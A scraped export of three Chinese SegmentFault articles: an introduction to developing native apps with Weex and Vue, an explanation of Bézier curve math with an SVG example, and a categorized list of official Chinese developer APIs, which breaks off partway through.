<p>这个项目实际证明了 Weex + Vue 在 Web 、Android 和 iOS 上都是完全可以运行的，Vuex 和 vue-router 也可以运行在移动端上。我是验证过的，所以我可以有底气地说：<strong>Weex + Vue 可以开发原生应用！Weex + Vue 可以开发原生应用！！Weex + Vue 可以开发原生应用！！！</strong></p>
<blockquote><p>为什么确认是“全球首个”，因为在写这个项目的时候，还没对外发布过支持 Vue 的 WeexSDK，没有使用 Vue 的文档，甚至还没有 Web 端的渲染器（weex-vue-render）。我当时是一边写项目，一边写 Web 渲染器，一边适配 Vue 在 Native 上运行有没有问题，最后才补的文档。。。</p></blockquote>
<p>我是一个前端，略懂一些 Andorid 和 iOS ，可能客户端上的代码质量并不高，如果大家看哪里不顺眼，欢迎给我提 PR ~</p>
<h2>阅读官方文档</h2>
<ul>
<li><a href=""https://weex-project.io/cn/guide/index.html"" rel=""nofollow noreferrer"">《Weex 快速上手》</a></li>
<li><a href=""https://cn.vuejs.org/v2/guide/"" rel=""nofollow noreferrer"">《Vue.js 介绍》</a></li>
<li><a href=""https://weex-project.io/cn/references/platform-difference.html"" rel=""nofollow noreferrer"">《Weex 和 Web 平台的差异》</a></li>
<li><a href=""https://weex-project.io/cn/guide/intro/using-vue.html"" rel=""nofollow noreferrer"">《使用 Vue 开发 Weex 页面》</a></li>
<li><a href=""https://weex-project.io/cn/references/vue/difference-with-web.html"" rel=""nofollow noreferrer"">《Vue.js 在 Weex 和 Web 中的差异》</a></li>
<li><a href=""https://weex-project.io/cn/references/vue/difference-of-vuex.html"" rel=""nofollow noreferrer"">《在 Weex 中使用 Vuex 和 vue-router》</a></li>
</ul>
<h2>系列文章目录</h2>
<p>因为这跨框架甚至跨端的技术，放在谁那里都不合适，所以官方文档都写得中立一些；这个系列的文章会比官方文档更详细一些，而且会以 weex-hackernews 为实例讲代码，讲细节。</p>
<p>每个人对 Weex 和 Vue 的了解程度不一样，对原生开发和前端开发的了解程度也不一样，所以没有最佳学习顺序，建议【看文档】【看代码】【写例子】交叉循环。</p>
<ul>
<li>0 《项目介绍和文章目录》</li>
<li>1 <a href=""https://segmentfault.com/a/1190000008344148"" rel=""nofollow noreferrer"">《配置开发环境》</a>
</li>
<li>2 <a href=""https://segmentfault.com/a/1190000008366358"" rel=""nofollow noreferrer"">《编写独立页面》</a>
</li>
<li>3 <a href=""https://segmentfault.com/a/1190000008432907"" rel=""nofollow noreferrer"">《使用 Vue 框架的特性》</a>
</li>
<li>4 <a href=""https://segmentfault.com/a/1190000008464683"" rel=""nofollow noreferrer"">《使用 Weex 平台的功能》</a>
</li>
<li>5 <a href=""https://segmentfault.com/a/1190000008520677"" rel=""nofollow noreferrer"">《使用 Vuex》</a>
</li>
<li>6 <a href=""https://segmentfault.com/a/1190000009101411"" rel=""nofollow noreferrer"">《使用 vue-router》</a>
</li>
<li>7 <a href=""https://segmentfault.com/a/1190000009101907"" rel=""nofollow noreferrer"">《完整项目目录详解》</a>
</li>
</ul>

                ", [使用 Weex 和 Vue 开发原生应用] 0 项目介绍和文章目录,1531971982,458,1,508,1,1,https://segmentfault.com/a/1190000008342533
75,1,0,6,"
                    
<h2>贝塞尔曲线的数学原理</h2>
<p>我相信所有射鸡师们都知道贝塞尔曲线是什么，习惯用PS的会用钢笔工具，习惯用AI的会用贝塞尔，因为它所绘制出来的曲线很容易受我们控制也很美观，那么接下来我们来深入了解一下这个贝塞尔曲线的数学原理和公式。</p>
<p>在数学中，贝塞尔又分为很多种，一阶贝塞尔曲线、二阶贝塞尔曲线、三阶贝塞尔曲线····等等等等，除了一阶贝塞尔是直线外剩下的多阶贝塞尔都是抛物线。而它又由起点、终点和控制点组成，根据控制点的个数和位置决定这个曲线的最终样式。<br>&lt;!--more--&gt;</p>
<h3>原理</h3>
<p>我们先在一个平面内任选 3 个不共线的点，依次用线段连接。如图<br><span class=""img-wrap""><img data-src=""/img/remote/1460000008219433?w=600&amp;h=400"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""此处输入图片的描述"" title=""此处输入图片的描述""></span></p>
<p>在第一条线段上任选一个点 D。计算该点到线段起点的距离 AD，与该线段总长 AB 的比例。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000008219434?w=600&amp;h=400"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""此处输入图片的描述"" title=""此处输入图片的描述""></span></p>
<p>根据上一步得到的比例，从第二条线段上找出对应的点 E，使得 AD:AB = BE:BC。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000008219435?w=600&amp;h=400"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""此处输入图片的描述"" title=""此处输入图片的描述""></span></p>
<p>连接这两点 DE。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000005765451"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""此处输入图片的描述"" title=""此处输入图片的描述""></span></p>
<p>从新的线段 DE 上再次找出相同比例的点 F，使得 DF:DE = AD:AB = BE:BC。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000005765467"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""此处输入图片的描述"" title=""此处输入图片的描述""></span></p>
<p>到这里，我们就确定了贝塞尔曲线上的一个点 F。接下来，请稍微回想一下中学所学的极限知识，让选取的点 D 在第一条线段上从起点 A 移动到终点 B，找出所有的贝塞尔曲线上的点 F。所有的点找出来之后，我们也得到了这条贝塞尔曲线。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000008219436?w=600&amp;h=400"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""此处输入图片的描述"" title=""此处输入图片的描述""></span></p>
<p>想象不出?没关系，看动画<br><span class=""img-wrap""><img data-src=""/img/remote/1460000008219437?w=360&amp;h=150"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""此处输入图片的描述"" title=""此处输入图片的描述""></span></p>
<p>那么，我们已经大概了解到贝塞尔绘制出来的过程了，下面看公式</p>
<h3>1.一阶贝塞尔</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008219438?w=360&amp;h=150"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""此处输入图片的描述"" title=""此处输入图片的描述""></span></p>
<p>一阶贝塞尔只有起点和终点，并没有控制点，所以绘制出来的图形仅仅只是一条直线，那么在时间t为1秒的情况下的公式如下</p>
<p>$ B(t)=(1-t)P_0+tP_1 ,tin[0,1] $</p>
<h3>2.二阶贝塞尔</h3>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008219439"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""此处输入图片的描述"" title=""此处输入图片的描述""></span></p>
<p>二阶贝塞尔只存在一个控制点，此时从起点到终点的线段发生变化，具体的变化是由控制点的位置而改变的，图中绿色的线段为红色曲线的切线</p>
<p>$B(t) = (1-t)^2P_0+2t(1-t)P_1+t^2P_2,tin[0,1]$</p>
<p>仅仅只是简单的一元二次方程式</p>
<h3>3.高阶贝塞尔</h3>
<ul><li><p>三阶</p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008219440"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""此处输入图片的描述"" title=""此处输入图片的描述""></span></p>
<ul><li><p>四阶</p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008219441"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""此处输入图片的描述"" title=""此处输入图片的描述""></span></p>
<ul><li><p>五阶</p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008219442"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""此处输入图片的描述"" title=""此处输入图片的描述""></span></p>
<p>从三阶开始贝塞尔就显得复杂了，高阶的通用公式如下<br>$$ P_i^k=(1-t)P_i^{k-1}+tP_{i+1}^{k-1}$$</p>
<p>$$k=1,2,···,n$$</p>
<p>$$i=0,1,···,n-k$$</p>
<p>可以通过链接动态绘制多阶贝塞尔曲线<a href=""http://myst729.github.io/bezier-curve/"" rel=""nofollow noreferrer"">DEMO</a></p>
<h2>SVG绘制贝塞尔</h2>
<p>为什么选用SVG而不选择Canvas是因为演示起来简单，而且SVG对矢量图形的渲染更好，也就更适合拿来做几何图形的描绘，而Canvas适合游戏等比较大的渲染</p>
<pre><code class=""javascript"">&lt;svg width=""190px"" height=""160px"" version=""1.1"" xmlns=""http://www.w3.org/2000/svg""&gt;

  &lt;path d=""M10 10 C 20 20, 40 20, 50 10"" stroke=""black"" fill=""transparent""/&gt;
  &lt;path d=""M70 10 C 70 20, 120 20, 120 10"" stroke=""black"" fill=""transparent""/&gt;
  &lt;path d=""M130 10 C 120 20, 180 20, 170 10"" stroke=""black"" fill=""transparent""/&gt;
  &lt;path d=""M10 60 C 20 80, 40 80, 50 60"" stroke=""black"" fill=""transparent""/&gt;
  &lt;path d=""M70 60 C 70 80, 110 80, 110 60"" stroke=""black"" fill=""transparent""/&gt;
  &lt;path d=""M130 60 C 120 80, 180 80, 170 60"" stroke=""black"" fill=""transparent""/&gt;
  &lt;path d=""M10 110 C 20 140, 40 140, 50 110"" stroke=""black"" fill=""transparent""/&gt;
  &lt;path d=""M70 110 C 70 140, 110 140, 110 110"" stroke=""black"" fill=""transparent""/&gt;
  &lt;path d=""M130 110 C 120 140, 180 140, 170 110"" stroke=""black"" fill=""transparent""/&gt;

&lt;/svg&gt;</code></pre>
<p>结果如图<br><span class=""img-wrap""><img data-src=""/img/remote/1460000008219443?w=190&amp;h=160"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""此处输入图片的描述"" title=""此处输入图片的描述""></span></p>

                ", 贝塞尔曲线的数学原理,1531971984,496,1,345,1,1,https://segmentfault.com/a/1190000008219430
76,1,0,6,"
                    
<p>项目地址：<a href=""https://github.com/marktony/Awesome_API"" rel=""nofollow noreferrer"">https://github.com/marktony/A...</a></p>
<p>本页仅收集国内部分官方API，如需查看其他版本，请点击<a href=""https://github.com/marktony/Awesome_API"" rel=""nofollow noreferrer"">这里</a>。</p>
<h3>目录</h3>
<ul>
<li><p><a>笔记</a></p></li>
<li><p><a>出行</a></p></li>
<li><p><a>词典</a></p></li>
<li><p><a>电商</a></p></li>
<li><p><a>地图</a></p></li>
<li><p><a>电影</a></p></li>
<li><p><a>即时通讯</a></p></li>
<li><p><a>开发者网站</a></p></li>
<li><p><a>快递查询</a></p></li>
<li><p><a>旅游</a></p></li>
<li><p><a>社交</a></p></li>
<li><p><a>视频</a></p></li>
<li><p><a>天气</a></p></li>
<li><p><a>图片与图像处理</a></p></li>
<li><p><a>外卖</a></p></li>
<li><p><a>消息推送</a></p></li>
<li><p><a>音乐</a></p></li>
<li><p><a>云</a></p></li>
<li><p><a>语音识别</a></p></li>
<li><p><a>综合</a></p></li>
</ul>
<h4>笔记</h4>
<ul>
<li><p><a href=""http://www.wiz.cn/manual/plugin/"" rel=""nofollow noreferrer"">为知笔记</a> - 为知笔记Windows客户端开放了大量的API，其中绝大部分，都通过COM提供，可以在javascript, C#, C++, Delphi等语言中使用。接口通过IDL(Interface description language)语言描述。</p></li>
<li><p><a href=""https://dev.yinxiang.com/"" rel=""nofollow noreferrer"">印象笔记</a> - 印象笔记提供了ActionScript 3, Android, C++, Windows, iOS, Java, JavaScript, OS X, Perl, PHP, Python, Ruby等平台的SDK和完整的API参考文档，可通过API进行认证，笔记，笔记本，附件，搜索，同步等操作，同时提供企业版和本地API。</p></li>
<li><p><a href=""http://note.youdao.com/open/"" rel=""nofollow noreferrer"">有道云笔记</a> - 有道云笔记提供了Android SDK，同时Open API允许进行授权，用户，笔记本，笔记，分享，附件等方面的操作。</p></li>
</ul>
<h4>出行</h4>
<ul>
<li><p><a href=""http://open.xiaojukeji.com/"" rel=""nofollow noreferrer"">滴滴</a> - 滴滴提供了iOS和Android SDK, 可实现拉起滴滴叫车等方面的操作。</p></li>
<li><p><a href=""http://developerpre.10101111.com/"" rel=""nofollow noreferrer"">神州专车</a> - 神州专车提供了API模式和H5模式两种接入模式，允许进行基础信息，订单，支付，充值，用户，发票，代金券，企业等方面的操作。</p></li>
<li><p><a href=""https://developer.uber.com/"" rel=""nofollow noreferrer"">Uber</a> - Uber提供了Android和iOS的SDK,允许进行乘客，行程体验，司机，派送次数等四大方面的操作。</p></li>
</ul>
<h4>词典</h4>
<ul>
<li><p><a href=""http://api.fanyi.baidu.com/api/trans/product/index"" rel=""nofollow noreferrer"">百度翻译</a> - 百度翻译支持多种语言互相翻译，包含PHP, JS, Python, C, Java版Demo。</p></li>
<li><p><a href=""https://www.microsoft.com/en-us/translator/translatorapi.aspx"" rel=""nofollow noreferrer"">必应词典</a> - 微软翻译API支持文字和语音两种类型，支持多种语言互相翻译，提供C#版本Demo。</p></li>
<li><p><a href=""http://open.iciba.com/?c=api"" rel=""nofollow noreferrer"">金山词霸</a> - 金山词霸允许进行简单的翻译操作。</p></li>
<li><p><a href=""https://www.shanbay.com/help/developer/api_v1/"" rel=""nofollow noreferrer"">扇贝</a> - 扇贝提供了完整的API，允许进行用户，查询，添加学习记录，忘记单词，例句，笔记等方面的操作。</p></li>
<li><p><a href=""http://fanyi.youdao.com/openapi"" rel=""nofollow noreferrer"">有道词典</a> - 有道词典允许进行简单的翻译操作。</p></li>
</ul>
<h4>电商</h4>
<ul>
<li><p><a href=""http://open.dangdang.com/"" rel=""nofollow noreferrer"">当当</a> - 当当允许商家用户和网站接入授权，可进行商品，订单，图片，问答，店铺和促销等方面的操作。</p></li>
<li><p><a href=""https://jos.jd.com/api/index.htm"" rel=""nofollow noreferrer"">京东</a> - 京东提供了Java, PHP, .net的SDK，授权后可进行多种操作。</p></li>
<li><p><a href=""http://open.suning.com/ospos/apipage/toApiListMenu.do"" rel=""nofollow noreferrer"">苏宁开放服务</a> - 苏宁提供了Java, PHP, .Net, Python版本的SDK，授权后可进行多种操作。</p></li>
<li><p><a href=""https://open.taobao.com/doc2/api_list.htm"" rel=""nofollow noreferrer"">淘宝开放平台</a> - 淘宝提供了Java, .Net, PHP, Python版本的SDK，授权后提供多种操作。</p></li>
<li><p><a href=""https://developer.amazon.com/public/zh"" rel=""nofollow noreferrer"">亚马逊</a> - 亚马逊提供多种语言版本的SDK，授权后允许多种操作。</p></li>
</ul>
<h4>地图</h4>
<ul>
<li><p><a href=""http://lbsyun.baidu.com/"" rel=""nofollow noreferrer"">百度地图</a> - 百度地图提供了Android, iOS版本的SDK和JavaScript API，可进行定位、地图、数据、出行、鹰眼轨迹和分析服务。</p></li>
<li><p><a href=""http://lbs.amap.com/"" rel=""nofollow noreferrer"">高德地图</a> - 高德地图提供了JavaScript和web服务API，Android和iOS SDK，支持地图，定位，搜索，路线规划，导航和室内地图等。</p></li>
<li><p><a href=""http://lbs.qq.com/"" rel=""nofollow noreferrer"">腾讯地图</a> - 腾讯地图提供了JavaScript API，Android和iOS SDK，支持定位，地图，地点搜索，路线和导航等。</p></li>
<li><p><a href=""http://lbs.tianditu.com/api-new/home.html"" rel=""nofollow noreferrer"">天地图</a> - 天地图提供了H5 API和JavaScript API等web API，同时提供了Android和iOS SDK，支持基础地图服务，图层管理，地图覆盖物，地图工具，地名搜索和出行规划服务。</p></li>
<li><p><a href=""http://open.mapbar.com/"" rel=""nofollow noreferrer"">图吧地图</a> - 图吧提供了JavaScript和Flash API，Android和iOS SDK，支持定位，地址解析，位置标注，位置截图，路线规划，周边查询，兴趣点搜索和在线导航。</p></li>
</ul>
<h4>电影</h4>
<ul><li><p><a href=""https://developers.douban.com/wiki/?title=movie_v2"" rel=""nofollow noreferrer"">豆瓣电影</a> - 豆瓣电影支持电影条目，影人条目，搜索和榜单等。</p></li></ul>
<h4>即时通讯</h4>
<ul>
<li><p><a href=""http://www.easemob.com/"" rel=""nofollow noreferrer"">环信</a> - 支持Android, iOS, WebIM, Linux, REST集成，支持多种消息类型。</p></li>
<li><p><a href=""http://rongcloud.cn/"" rel=""nofollow noreferrer"">融云</a> - 支持Android, iOS, Web, 游戏集成，支持多种消息类型。</p></li>
<li><p><a href=""http://netease.im/"" rel=""nofollow noreferrer"">网易云信</a> - 支持IM实时通讯，实时音视频，教学白班，专线电话，短信，聊天室，提供iOS, Android, Windows和Web SDK。</p></li>
<li><p><a href=""https://www.qcloud.com/product/im"" rel=""nofollow noreferrer"">腾讯云通信IM</a> - 提供iOS, Android, Windows和Web SDK，支持多种消息类型。</p></li>
</ul>
<h4>开发者网站</h4>
<ul>
<li><p><a href=""http://gank.io/api"" rel=""nofollow noreferrer"">干货集中营</a> - 提供妹子图和Android, iOS, 前端，拓展资源等内容。</p></li>
<li><p><a href=""https://www.diycode.cc/api"" rel=""nofollow noreferrer"">diycode</a> - 授权后可访问diycode网站的内容。</p></li>
<li><p><a href=""http://www.oschina.net/openapi"" rel=""nofollow noreferrer"">开源中国</a> - 授权后可访问开源中国网站的内容。</p></li>
<li><p><a href=""https://ruby-china.org/api-doc/"" rel=""nofollow noreferrer"">Ruby China</a> - 授权后可访问Ruby China网站的内容。</p></li>
<li><p><a href=""https://www.v2ex.com/p/7v9TEc53"" rel=""nofollow noreferrer"">V2EX</a> - 可访问V2EX网站的内容。</p></li>
</ul>
<h4>快递查询</h4>
<ul>
<li><p><a href=""http://www.aikuaidi.cn/api/"" rel=""nofollow noreferrer"">爱快递</a> - 爱快递支持国内90多家快递物流订单查询服务，免费版有使用次数限制，可用于电子商城单号跟踪,手机应用,微信快递接口等服务。</p></li>
<li><p><a href=""http://www.kuaidi100.com/openapi/"" rel=""nofollow noreferrer"">快递100</a> - 快递100支持300家国内国际快递，免费版有使用次数限制。</p></li>
<li><p><a href=""http://www.kdniao.com/"" rel=""nofollow noreferrer"">快递鸟</a> - 快递鸟支持国内外400多家快递公司，免费版有使用次数限制，包含.Net, PHP, Java版Demo。</p></li>
<li><p><a href=""http://www.kuaidi.com/openapi.html"" rel=""nofollow noreferrer"">快递网</a> - 快递网支持上百家快递查询服务，免费版有使用次数限制。</p></li>
</ul>
<h4>旅游</h4>
<ul>
<li><p><a href=""http://open.qunar.com/"" rel=""nofollow noreferrer"">去哪儿</a> - 支持获取去哪儿网的内容。</p></li>
<li><p><a href=""http://open.tuniu.cn/"" rel=""nofollow noreferrer"">途牛</a> - 支持途牛网的内容，仅开放给供应商系统。</p></li>
<li><p><a href=""http://u.ctrip.com/union/help/Termsofuse.aspx"" rel=""nofollow noreferrer"">携程</a> - 支持携程网的内容。</p></li>
<li><p><a href=""http://open.elong.com/wiki/API%E6%96%87%E6%A1%A3"" rel=""nofollow noreferrer"">艺龙</a> - 支持获取产品数据，完成用户的预订，进行订单查询、更改或取消。提供在线工具，以及H5, Java, C#, PHP, Ruby版本的Demo。</p></li>
</ul>
<h4>社交</h4>
<ul>
<li><p><a href=""https://open-doc.dingtalk.com/"" rel=""nofollow noreferrer"">钉钉</a> - 支持免登，企业通讯录，服务窗，钉盘，地图，会话，DING，电话，音频，扫码，支付，分享等服务，提供SDK和Demo，PC版UI规范，调试工具和钉钉UI组件库。</p></li>
<li><p><a href=""https://developers.douban.com/wiki/?title=guide"" rel=""nofollow noreferrer"">豆瓣</a> - 支持图书，电影，音乐，同城，广播，用户，日记，相册，线上活动，论坛，回复和我去等功能，提供豆瓣组件，豆瓣标示和Demo。</p></li>
<li><p><a href=""http://open.kaixin001.com/document.php"" rel=""nofollow noreferrer"">开心网</a> - 支持用户信息，登录授权，好友，传播应用，支付，分享内容，消息，交互，开心网应用等内容，提供SDK，开源插件和标示素材。</p></li>
<li><p><a href=""http://wiki.connect.qq.com/api%E5%88%97%E8%A1%A8"" rel=""nofollow noreferrer"">QQ互联</a> - 支持用户资料，QQ会员信息，空间相册，腾讯微博资料，分享到腾讯微博，微博好友信息，财付通信息等内容，提供SDK, Demo, 以及设计资源。</p></li>
<li><p><a href=""http://open.weibo.com/wiki/API"" rel=""nofollow noreferrer"">微博</a> - 支持粉丝服务，微博，评论，用户，关系，账号，收藏，搜索，提醒，短链，公共服务，位置服务，地理信息，地图引擎，支付以及OAuth2.0授权等内容，提供微博标示及SDK。</p></li>
<li><p><a href=""https://open.weixin.qq.com/"" rel=""nofollow noreferrer"">微信</a> - 支持移动应用，网站应用，公众账号，公众号第三方平台等内容，提供SDK, Demo, 以及设计资源。</p></li>
</ul>
<h4>视频</h4>
<ul>
<li><p><a href=""http://open.iqiyi.com/"" rel=""nofollow noreferrer"">爱奇艺</a> - 支持弹幕，全色彩播放器，高清码流，视频托管，播放爱奇艺视频，应用分发，IOCP等内容。</p></li>
<li><p><a href=""http://www.lecloud.com/zh-cn/help/api.html"" rel=""nofollow noreferrer"">乐视</a> - 支持标准直播，标准点播，视频发行平台，移动直播等内容，提供SDK下载。</p></li>
<li><p><a href=""http://lm.tv.sohu.com/union/open_platform.do"" rel=""nofollow noreferrer"">搜狐视频</a> - 支持一二级内容获取，内容分类获取，视频详情信息，专辑详情信息，分级列表获取，关键词搜索等内容。</p></li>
<li><p><a href=""http://api.tudou.com/apidoc/index.php/%E9%A6%96%E9%A1%B5"" rel=""nofollow noreferrer"">土豆</a> - 支持视频模块，豆单模块，影视库模块，用户模块，转帖模块，字段定义模块等内容。</p></li>
<li><p><a href=""http://doc.open.youku.com/?spm=0.0.0.0.fOn6ND"" rel=""nofollow noreferrer"">优酷</a> - 支持内容输出，视频搜索，智能推荐，用户登录，用户互动，用户信息，视频上传至优酷，视频互动等内容，提供SDK。</p></li>
</ul>
<h4>天气</h4>
<ul>
<li><p><a href=""http://wiki.swarma.net/index.php/%E5%BD%A9%E4%BA%91%E5%A4%A9%E6%B0%94API/v2"" rel=""nofollow noreferrer"">彩云天气</a> - 支持全球天气数据，两种空气质量数据，天气预报，实况天气，独家降水预报，独家空气质量预报，六种天气数据，四种生活指数数据等内容，部分功能收费。</p></li>
<li><p><a href=""http://www.kancloud.cn/hefengyun/weather/222344"" rel=""nofollow noreferrer"">和风天气</a> - 支持7-10天预报，实况天气，每小时预报，生活指数，灾害预警，景点天气，历史天气，城市查询等内容，仅国内数据免费。</p></li>
<li><p><a href=""http://www.thinkpage.cn/doc"" rel=""nofollow noreferrer"">心知天气</a> - 支持天气实况，逐日预报和历史，24小时逐小时预报，过去24小时天气历史记录，气象灾害预警，空气质量实况与城市排行，逐日和逐小时空气质量预报，过去24小时空气质量历史记录，生活指数，农历、节气、生肖，机动车尾号限行，日出日落，月初月落和月像，城市搜索等内容，仅国内数据免费。</p></li>
</ul>
<h4>图片与图像处理</h4>
<ul>
<li><p><a href=""https://github.com/pinguo/PGSkinPrettifyEngine"" rel=""nofollow noreferrer"">Camera360</a> - 支持全帧率直播美白滤镜，提供SDK和Demo。</p></li>
<li><p><a href=""http://imgsdk.com/"" rel=""nofollow noreferrer"">嗨图</a> - 支持图片标注，仅提供iOS版本SDK。</p></li>
<li><p><a href=""https://dev.camcard.com/?language=zh-cn"" rel=""nofollow noreferrer"">名片全能王</a> - 支持精准识别几十种语言的名片，自动切边并美化名片图像，自动返回识别结果，提供多种版本SDK，收费。</p></li>
<li><p><a href=""http://www.intsig.com/zh/products/camcard_for_id"" rel=""nofollow noreferrer"">企业证件识别</a> - 支持身份证，驾驶证，护照等，收费。</p></li>
<li><p><a href=""https://dev.camscanner.com/?language=zh-cn"" rel=""nofollow noreferrer"">扫描全能王</a> - 支持图像智能剪裁，五种图像增强模式，手动调节图像细节，自动返回扫描结果等，提供iOS与Android版本SDK，收费。</p></li>
<li><p><a href=""http://api1.wozhitu.com/"" rel=""nofollow noreferrer"">我知图</a> - 支持相似图像搜索，图像识别匹配，图像识别关键词推荐，重复图片探测等内容。</p></li>
<li><p><a href=""http://www.intsig.com/zh/products/creditcard"" rel=""nofollow noreferrer"">银行卡|信用卡识别</a> - 提供SDK和API，收费。</p></li>
</ul>
<h4>外卖</h4>
<ul>
<li><p><a href=""http://dev.waimai.baidu.com/"" rel=""nofollow noreferrer"">百度外卖</a> - 支持商户，菜品，商品，订单和基础数据等内容，提供SDK和Demo。</p></li>
<li><p><a href=""http://developer.dianping.com/"" rel=""nofollow noreferrer"">大众点评</a> - 支持商户，团购，在线预定，商品点评，数据统计，元数据等内容。</p></li>
<li><p><a href=""http://openapi.eleme.io/v2/quickstart.html"" rel=""nofollow noreferrer"">饿了么</a> - 支持查询，预定，订单，其他订单，数据推送，支付，评价，活动，账户同步，数据落地同步等内容。</p></li>
<li><p><a href=""http://developer.waimai.meituan.com/doc/show"" rel=""nofollow noreferrer"">美团外卖</a> - 支持门店，配送范围，菜品，药品，订单，订单推送等内容。</p></li>
</ul>
<h4>消息推送</h4>
<ul>
<li><p><a href=""http://push.baidu.com/doc/restapi/restapi"" rel=""nofollow noreferrer"">百度云推送</a> - 支持iOS, Android和服务器端，支持推送，统计，组管理等Rest API接口。服务器端支持Java, Python, PHP, REST API。提供所支持各语言版本的SDK。</p></li>
<li><p><a href=""http://developer.huawei.com/push"" rel=""nofollow noreferrer"">华为推送</a> - 支持Android，提供SDK。</p></li>
<li><p><a href=""https://docs.jiguang.cn/jpush/server/push/rest_api_v3_push/"" rel=""nofollow noreferrer"">极光</a> - 支持Android, iOS, WindowsPhone, 服务器端REST API, 提供Java, Python, PHP, Ruby, C#, Node.js等版本的SDK。</p></li>
<li><p><a href=""https://leancloud.cn/docs/push_guide.html"" rel=""nofollow noreferrer"">LeanCloud</a> - 支持Android, iOS, WindowsPhone和Web网页推送，使用云引擎和JavaScript创建推送，使用REST API推送消息。提供Objectvie-C(开放源码), JavaScript(开放源码), Android, Unity, .Net, WindowsPhone, Java(开放源码), Python(开放源码), PHP(开放源码), C++(开放源码), Swift(开放源码)版本SDK。同时提供Demo。</p></li>
<li><p><a href=""http://xg.qq.com/"" rel=""nofollow noreferrer"">腾讯信鸽</a> - 支持iOS和Android平台，服务器端采用Rest API, 同时服务器端支持Java, PHP, Python等语言并提供SDK。</p></li>
<li><p><a href=""http://dev.xiaomi.com/console/appservice/push.html"" rel=""nofollow noreferrer"">小米</a> - 支持Android和iOS平台，服务器端支持Java, Python并提供SDK。</p></li>
<li><p><a href=""http://dev.umeng.com/push/android/api-doc"" rel=""nofollow noreferrer"">友盟</a> - 支持Android和iOS平台，服务器端支持PHP, Java, Python并提供SDK。</p></li>
</ul>
<h4>音乐</h4>
<ul>
<li><p><a href=""https://developers.douban.com/wiki/?title=music_v2"" rel=""nofollow noreferrer"">豆瓣音乐</a> - 支持音乐信息，评论信息，标签信息，搜索音乐，某个音乐中标记最多的标签，发表、修改、删除评论，用户对音乐的所有标签等内容。</p></li>
<li><p><a href=""https://github.com/kaolafm/api"" rel=""nofollow noreferrer"">考拉FM</a> - 支持获取指定分类下列表和内容，搜索指定关键字内容，专辑/电台/直播详情，指定专辑下列表，指定电台播单，分类下专辑TOP50，指定期(碎片)所在专辑最新分页功能，分类下全部直播计划，版本升级接口，排行榜，精选，传统电台列表/详情/地区等。</p></li>
<li><p><a href=""http://wq.qq.com/"" rel=""nofollow noreferrer"">企鹅FM</a> - 支持获取电台分类列表，电台分类下的专辑信息列表，专辑下节目信息列表，电台节目播放链接，搜索关键字相关主播/专辑/节目，主播名下专辑，特定时间段内新增主播/更新的专辑/新增的专辑等。</p></li>
<li><p><a href=""http://open.qingting.fm/"" rel=""nofollow noreferrer"">蜻蜓FM</a> - 支持OAuth2.0授权，音频数据中心，分类，点播，直播，临时直播，排行榜，搜索，内容更新状态，主播，此刻，专题，活动等内容。</p></li>
<li><p><a href=""http://open.ximalaya.com/index"" rel=""nofollow noreferrer"">喜马拉雅FM</a> - 支持Android和iOS平台，并提供相应的SDK和Demo，具体支持内容请下载相关文件查看。</p></li>
</ul>
<h4>云</h4>
<ul>
<li><p><a href=""https://develop.aliyun.com/api?spm=5176.8142029.388261.274.4FJSwV"" rel=""nofollow noreferrer"">阿里云</a> - 支持弹性计算，数据库，存储与CDN，网络，应用服务，域名与网站等类别的内容，并提供了相关SDK。</p></li>
<li><p><a href=""https://cloud.baidu.com/doc/index.html"" rel=""nofollow noreferrer"">百度云</a> - 支持计算和网络，存储和CDN，数据库，安全和管理，数据分析，智能多媒体服务，物联网服务，人工智能，应用服务，网站服务，数字营销服务等内容，并提供相关的SDK。</p></li>
<li><p><a href=""http://www.bmob.cn/"" rel=""nofollow noreferrer"">Bmob</a> - 支持云数据库，容器服务，消息推送，文件存储，短信验证码，及时通讯，云端逻辑，定时任务，地理位置等。</p></li>
<li><p><a href=""https://leancloud.cn/"" rel=""nofollow noreferrer"">LeanCloud</a> -     支持云存储，数据分析，用户关系，实时通讯，消息推送，移动统计等。</p></li>
<li><p><a href=""http://www.qiniu.com/"" rel=""nofollow noreferrer"">七牛云</a> - 支持对象存储，融合CDN，直播云，数据处理等。</p></li>
<li><p><a href=""https://www.qcloud.com/doc/api"" rel=""nofollow noreferrer"">腾讯云</a> - 支持计算，网络，存储与CDN，数据库，安全服务，监控与管理，域名服务，视频服务，大数据与AI等内容，提供相关SDK。</p></li>
<li><p><a href=""https://www.wilddog.com/"" rel=""nofollow noreferrer"">野狗</a> - 支持实时数据同步，实时视频通话，及时通讯，短信，身份认证等。</p></li>
</ul>
<h4>语音识别</h4>
<ul>
<li><p><a href=""http://yuyin.baidu.com/"" rel=""nofollow noreferrer"">百度语音</a> - 支持全平台REST API, 离线在线融合模式，深度语义解析，场景识别定制，自定义上传语料、训练模型，基础服务永久免费。提供相应SDK和Demo应用。</p></li>
<li><p><a href=""http://openspeech.sogou.com/Sogou/php/index.php"" rel=""nofollow noreferrer"">搜狗语音云开放平台</a> - 支持在线/离线语音识别，在线听歌识曲，离线语音合成等内容。提供相应平台SDK。</p></li>
